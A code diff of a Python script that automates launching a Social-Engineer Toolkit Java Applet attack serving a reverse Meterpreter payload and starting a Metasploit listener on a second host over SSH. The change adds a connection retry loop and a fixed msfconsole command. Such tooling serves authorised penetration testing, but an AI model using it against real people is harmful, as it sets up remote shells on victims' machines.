@@ -113,19 +113,21 @@ def java_applet(idic, user, sshkey, idic2=None):
         set_auto(idic["ip"], user, autofile, sshkey)
         print green("\nSET Launched Java Applet (Reverse Meterpreter x86)..... browse to http://%s to test") % idic["ip"]
 
-        screen = fabfunky.metalistener(idic2["ip"], user, sshkey)
-        screen = screen.strip().split()
+        while True:
+            try:
+                sleep(2)
+                print yellow("Attempting to establish a connection to %s" % idic["ip"])
+                fabfunky.conn_est(idic2["ip"], user, sshkey)
+                break
+            except Exception:
+                print red("Instance is still initializing...")
+                pass
+
+        fabfunky.metalistener(idic2["ip"], user, sshkey)
         sleep(2)
-        if '.METALISTEN' in screen[5]:
-            print screen[5]
-            cmd = 'sudo screen -r %s' % screen[5]
-            print red("\nDropping into a SSH session....")
-            print green("SET Launched Java Applet at http://%s and metasploit listener is listening at %s") % (idic["ip"], idic2["ip"])
-            print yellow("\nRemember if you want to disconnect from the screen session hit CTRL+A+D to detatch and exit...\n")
-            sleep(2)
-            fabfunky.interactive_shell(idic2["ip"], user, cmd, sshkey)
-        else:
-            cmd = None
-            print red("\nDropping into a SSH session....\n")
-            print red("No screen session returned.")
-            fabfunky.interactive_shell(idic2["ip"], user, cmd, sshkey)
+        cmd = "sudo screen -S METALISTEN bash -c 'msfconsole -r /tmp/meta_config'"
+        print red("\nDropping into a SSH session....")
+        print green("SET Launched Java Applet at http://%s and metasploit listener is listening at %s") % (idic["ip"], idic2["ip"])
+        print yellow("\nRemember if you want to disconnect from the screen session hit CTRL+A+D to detatch and exit...\n")
+        sleep(2)
+        fabfunky.interactive_shell(idic2["ip"], user, cmd, sshkey)
